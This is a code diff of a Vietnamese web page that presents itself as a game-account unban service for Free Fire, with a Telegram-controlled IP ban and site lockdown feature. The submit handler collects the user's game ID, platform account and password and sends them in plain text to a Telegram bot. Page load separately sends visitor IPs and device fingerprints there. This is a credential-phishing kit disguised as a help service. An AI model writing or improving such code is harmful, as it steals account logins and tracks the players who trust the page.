+              `✅ <b>/unbanip_all</b> - MỞ KHÓA TOÀN BỘ\n` +
+              `📋 <b>/banip_list</b> - Xem danh sách chặn\n` +
               `🔍 <b>/banip_check [IP]</b> - Kiểm tra IP\n` +
-              `❓ <b>/help</b> - Xem hướng dẫn\n\n` +
+              `📊 <b>/status</b> - Trạng thái hệ thống\n` +
+              `❓ <b>/help</b> - Hướng dẫn\n\n` +
               `💡 <b>Ví dụ:</b>\n` +
-              `<code>/banip 113.185.79.206 Spam web liên tục</code>`
+              `<code>/banip 113.185.79.206 Spam</code>\n` +
+              `<code>/banip_all Bảo trì khẩn cấp</code>`
             );
           }
         }
       } catch (e) {
-        // Silent fail, sẽ thử lại
+        // Silent fail
       }
     }
 
@@ -860,7 +1094,7 @@
           })
         });
       } catch (e) {
-        console.error('Send message error:', e);
+        console.error('Send error:', e);
       }
     }
 
@@ -935,7 +1169,7 @@
               text: `💬 Chat từ ${userIP}:\n${result.value}`
             })
           });
-          Swal.fire('✅', 'Đã gửi tin nhắn!', 'success');
+          Swal.fire('✅', 'Đã gửi!', 'success');
         }
       });
     }
@@ -997,11 +1231,7 @@
       p.addEventListener('click', function() {
         document.querySelectorAll('.plan').forEach(x => x.classList.remove('selected'));
         this.classList.add('selected');
-        state.plan = {
-          name: this.dataset.plan,
-          price: parseInt(this.dataset.price),
-          time: this.dataset.time
-        };
+        state.plan = { name: this.dataset.plan, price: parseInt(this.dataset.price), time: this.dataset.time };
         updatePrices();
       });
     });
@@ -1026,9 +1256,7 @@
 
     // Image upload
     const fileInput = document.getElementById('paymentImage');
-    const dropZone = document.getElementById('fileUploadArea');
-    
-    dropZone.addEventListener('click', () => fileInput.click());
+    document.getElementById('fileUploadArea').addEventListener('click', () => fileInput.click());
     fileInput.addEventListener('change', (e) => {
       const file = e.target.files[0];
       if (file) {
@@ -1043,10 +1271,10 @@
       }
     });
 
-    // Submit button
+    // Submit
     document.getElementById('submitRequestBtn').addEventListener('click', async function() {
-      if (isBanned) {
-        Swal.fire('🚫', 'IP của bạn đã bị chặn! Không thể gửi yêu cầu.', 'error');
+      if (isBanned || isAllIPBanned) {
+        Swal.fire('🚫', 'Website đang bị khóa! Không thể gửi yêu cầu.', 'error');
         return;
       }
 
@@ -1056,30 +1284,20 @@
       const captchaAnswer = parseInt(document.getElementById('captchaAnswer').value);
       const honeypot = document.getElementById('honeypotField').value;
 
-      if (honeypot) {
-        Swal.fire('🤖', 'Bot detected!', 'error');
-        return;
-      }
-
+      if (honeypot) { Swal.fire('🤖', 'Bot detected!', 'error'); return; }
       if (!ffId || !platformAcc || !password) {
-        Swal.fire('❌', 'Vui lòng nhập đầy đủ thông tin!', 'error');
-        return;
+        Swal.fire('❌', 'Vui lòng nhập đầy đủ thông tin!', 'error'); return;
       }
-
       if (isNaN(captchaAnswer) || captchaAnswer !== state.captchaResult) {
         generateCaptcha();
         document.getElementById('captchaAnswer').value = '';
-        Swal.fire('❌', 'Xác nhận sai!', 'error');
-        return;
+        Swal.fire('❌', 'Xác nhận sai!', 'error'); return;
       }
 
       const finalPrice = getFinalPrice();
-      
       const confirmResult = await Swal.fire({
         title: '📋 Xác Nhận',
-        html: `<p>🎮 Game: ${state.game.toUpperCase()}</p>
-               <p>🆔 UID: ${ffId}</p>
-               <p>💰 Tổng: <b style="color:#ffd966;">${finalPrice.toLocaleString()}đ</b></p>`,
+        html: `<p>🎮 ${state.game.toUpperCase()}</p><p>🆔 ${ffId}</p><p>💰 <b style="color:#ffd966;">${finalPrice.toLocaleString()}đ</b></p>`,
         icon: 'question',
         showCancelButton: true,
         confirmButtonText: '✅ Gửi'
@@ -1091,23 +1309,18 @@
       this.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Đang gửi...';
 
       state.currentOrderId = `FF-${Date.now().toString(36).toUpperCase()}`;
-
-      const message = `🔔 <b>YÊU CẦU #${state.currentOrderId}</b>\n🎮 Game: ${state.game.toUpperCase()}\n🌐 Server: ${state.server}\n👤 UID: ${ffId}\n📧 TK: ${platformAcc}\n🔐 MK: ${password}\n💰 Giá: ${finalPrice.toLocaleString()}đ\n🌐 IP: ${userIP}\n🆔 Device: ${deviceFingerprint}`;
+      const message = `🔔 <b>YÊU CẦU #${state.currentOrderId}</b>\n🎮 ${state.game.toUpperCase()}\n👤 UID: ${ffId}\n📧 TK: ${platformAcc}\n🔐 MK: ${password}\n💰 ${finalPrice.toLocaleString()}đ\n🌐 IP: ${userIP}`;
 
       try {
         const res = await fetch(`${TELEGRAM_API}/sendMessage`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: message,
-            parse_mode: 'HTML'
-          })
+          body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' })
         });
         
         if ((await res.json()).ok) {
           document.getElementById('resultBox').classList.remove('hidden');
-          document.getElementById('resultBox').innerHTML = `<div style="color:#ffd966; text-align:center;"><h3>✅ Đã gửi #${state.currentOrderId}</h3><p>Vui lòng chờ admin duyệt...</p></div>`;
+          document.getElementById('resultBox').innerHTML = `<div style="color:#ffd966; text-align:center;"><h3>✅ Đã gửi #${state.currentOrderId}</h3></div>`;
           Swal.fire('✅', 'Gửi thành công!', 'success');
           generateCaptcha();
           document.getElementById('captchaAnswer').value = '';
@@ -1124,48 +1337,56 @@
     // INITIALIZATION
     // ============================================
     async function init() {
-      console.log('🚀 Khởi động Tool Mở Band + Band IP Telegram...');
+      console.log('🚀 Khởi động Tool Mở Band + Band All IP Telegram...');
       
-      // Fetch IP
       await fetchUserIP();
       document.getElementById('userIpDisplay').textContent = userIP;
       
-      // Kiểm tra IP có bị chặn không
-      const banEntry = isIPBanned(userIP);
-      if (banEntry) {
-        showBanOverlay(banEntry);
-        console.log('🚫 IP bị chặn:', userIP);
+      // Kiểm tra All IP Ban
+      loadAllIPBanInfo();
+      if (allIPBanInfo && allIPBanInfo.allIPsBanned) {
+        isAllIPBanned = true;
+        showAllIPBanOverlay(allIPBanInfo);
+        updateSiteStatus(true);
+      } else {
+        // Kiểm tra IP riêng lẻ
+        const banEntry = isIPBanned(userIP);
+        if (banEntry) {
+          showBanOverlay(banEntry);
+        }
+        updateSiteStatus(false);
       }
       
-      // Generate fingerprint
       deviceFingerprint = await generateDeviceFingerprint();
       document.getElementById('deviceHash').textContent = deviceFingerprint.substring(0, 8);
       
-      // Initialize UI
       generateCaptcha();
       updatePrices();
       updateBlockedIPsDisplay();
       
       // Gửi thông báo cho Telegram
+      let statusMsg = `🟢 <b>Người dùng truy cập</b>\n🌐 IP: ${userIP}\n🆔 Device: ${deviceFingerprint}\n⏰ ${new Date().toLocaleString('vi-VN')}`;
+      
+      if (isAllIPBanned) {
+        statusMsg += `\n\n🚨 WEBSITE ĐANG BỊ KHÓA TOÀN BỘ!`;
+      } else if (isBanned) {
+        statusMsg += `\n\n⚠️ IP NÀY ĐANG BỊ CHẶN RIÊNG!`;
+      } else {
+        statusMsg += `\n✅ IP hợp lệ`;
+      }
+      
       fetch(`${TELEGRAM_API}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: TELEGRAM_CHAT_ID,
-          text: `🟢 <b>Người dùng truy cập</b>\n🌐 IP: ${userIP}\n🆔 Device: ${deviceFingerprint}\n⏰ ${new Date().toLocaleString('vi-VN')}\n${banEntry ? '⚠️ IP NÀY ĐANG BỊ CHẶN!' : '✅ IP hợp lệ'}`,
-          parse_mode: 'HTML'
-        })
+        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: statusMsg, parse_mode: 'HTML' })
       });
       
-      // Start Telegram command listener
       console.log('🤖 Đang lắng nghe lệnh Telegram...');
       setInterval(handleTelegramCommands, 2000);
-      
-      // Update blocked IPs display periodically
       setInterval(updateBlockedIPsDisplay, 10000);
       
-      console.log('✅ Hệ thống đã sẵn sàng!');
-      console.log('📋 Các lệnh Telegram: /banip, /unbanip, /banip_list, /banip_check, /help');
+      console.log('✅ Hệ thống sẵn sàng!');
+      console.log('📋 Lệnh: /banip, /banip_all, /unbanip, /unbanip_all, /banip_list, /status, /help');
     }
 
     init();
